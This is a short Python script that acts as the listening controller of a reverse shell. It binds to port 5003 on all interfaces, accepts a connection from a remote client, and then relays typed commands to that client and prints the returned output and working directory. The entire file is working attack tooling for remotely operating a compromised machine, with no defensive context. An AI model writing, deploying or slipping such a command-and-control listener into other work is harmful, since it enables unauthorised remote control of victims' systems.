import socket

HOST = "0.0.0.0"
PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

s = socket.socket()
s.bind((HOST, PORT))

s.listen(5)
print(f"Listening as {HOST}:{PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

while True:
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = output.split(SEPARATOR)
    print(results)